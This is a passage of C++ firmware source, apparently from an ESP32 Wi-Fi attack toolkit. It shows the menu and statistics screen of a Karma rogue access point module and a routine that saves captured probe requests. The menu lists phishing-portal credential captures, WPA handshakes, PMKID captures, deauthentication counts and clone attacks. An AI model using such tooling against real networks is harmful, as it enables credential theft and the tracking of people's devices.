                    broadcastOptions.push_back({"Back", [&]() {}});
                    loopOptions(broadcastOptions);
                }},
                
                {"View Captures", [&]() {
                    std::vector<Option> viewOptions = {
                        {"Portal Creds", [&]() {
                            FS *fs;
                            if (getFsStorage(fs) && fs->exists("/PortalCreds")) {
                                loopSD(*fs, false, "TXT", "/PortalCreds");
                            } else {
                                displayTextLine("No captures yet");
                                delay(1000);
                            }
                        }},
                        {"Handshakes", [&]() {
                            FS *fs;
                            if (getFsStorage(fs) && fs->exists("/BrucePCAP/handshakes")) {
                                loopSD(*fs, false, "PCAP", "/BrucePCAP/handshakes");
                            } else {
                                displayTextLine("No handshakes yet");
                                delay(1000);
                            }
                        }},
                        {"Back", [&]() {}}
                    };
                    loopOptions(viewOptions);
                }},
                
                {"Save Probes", [&]() {
                    FS *saveFs;
                    if (getFsStorage(saveFs) && storageAvailable) {
                        saveProbesToFile(*saveFs, true);
                        displayTextLine("Probes saved!");
                    } else displayTextLine("No storage!");
                    delay(1000);
                }},
                
                {"Clear Probes", [&]() {
                    clearProbes();
                    displayTextLine("Probes cleared!");
                    delay(1000);
                }},
                
                {"Show Stats", [&]() {
                    drawMainBorderWithTitle("KARMA STATS");
                    int y = 40;
                    tft.setTextSize(1);
                    tft.setCursor(10, y); y += 15;
                    tft.print("Total Probes: " + String(totalProbes));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Unique Clients: " + String(uniqueClients));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Karma Responses: " + String(karmaResponsesSent));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Portals Launched: " + String(autoPortalsLaunched));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Clone Attacks: " + String(cloneAttacksLaunched));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Deauth Packets: " + String(deauthPacketsSent));
                    tft.setCursor(10, y); y += 15;
                    int vulnCount = 0;
                    for (const auto &clientPair : clientBehaviors)
                        if (clientPair.second.isVulnerable) vulnCount++;
                    tft.print("Vulnerable: " + String(vulnCount));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Pending Attacks: " + String(pendingPortals.size()));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Active Portals: " + String(activePortals.size()));
                    tft.setCursor(10, y); y += 15;
                    tft.print("PMKID Captured: " + String(pmkidCaptured));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Handshakes: " + String(handshakeBuffer.size()));
                    tft.setCursor(10, tftHeight - 20);
                    tft.print("Sel: Back");
                    while (!check(SelPress) && !check(EscPress)) {
                        if (check(PrevPress)) break;
                        delay(50);
                    }
                    screenNeedsRedraw = true;
                }},
                
                {"Exit Karma", [&]() { returnToMenu = true; }},
            };
            
            loopOptions(options);
            
            // Force full screen redraw after menu returns
            forceFullRedraw();
            drawMainBorderWithTitle("ENHANCED KARMA ATK");
            tft.setTextSize(FP);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            padprintln("Saved to " + FileSys);
            if (templateSelected) padprintln("Template: " + selectedTemplate.name);
            else padprintln("Template: None");
            padprintln("SEL/ESC: Menu | Prev/Next: Channel");
            
            screenNeedsRedraw = true;
            continue;
        }
        
        updateKarmaDisplay();
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

void saveProbesToFile(FS &fs, bool compressed) {
    if (!storageAvailable) return;
    if (!fs.exists("/ProbeData")) fs.mkdir("/ProbeData");
    if (compressed) {
        File file = fs.open(filen, FILE_WRITE);
        if (file) {
            file.write('K'); file.write('R'); file.write('M'); file.write(0x02);
            int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
            count = std::min(count, 100);
            uint16_t count16 = (uint16_t)count;
            file.write((uint8_t*)&count16, 2);
            for (int i = 0; i < count; i++) {
                int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                const ProbeRequest &probe = probeBuffer[idx];
                if (probe.ssid.isEmpty() || probe.ssid == "*WILDCARD*") continue;
                uint32_t timestamp = probe.timestamp;
                file.write((uint8_t*)&timestamp, 4);
                file.write((uint8_t*)probe.mac.c_str(), 17);
                int8_t rssi = (int8_t)probe.rssi;
                file.write((uint8_t*)&rssi, 1);
                file.write((uint8_t*)&probe.channel, 1);
                uint8_t ssidLen = (uint8_t)probe.ssid.length();
                file.write(&ssidLen, 1);
                if (ssidLen > 0 && probe.ssid != "*HIDDEN*") file.write((uint8_t*)probe.ssid.c_str(), ssidLen);
            }
            file.close();
        }
    } else {
        File file = fs.open(filen, FILE_WRITE);
        if (file) {
            file.println("Timestamp,MAC,RSSI,Channel,SSID");
            int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
            count = std::min(count, 100);
            for (int i = 0; i < count; i++) {
                int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                const ProbeRequest &probe = probeBuffer[idx];
                if (probe.ssid.length() > 0 && probe.ssid != "*WILDCARD*") {
                    file.printf("%lu,%s,%d,%d,\"%s\"\n", probe.timestamp, probe.mac.c_str(),
                               probe.rssi, probe.channel, probe.ssid.c_str());
                }
            }
            file.close();
        }
    }
}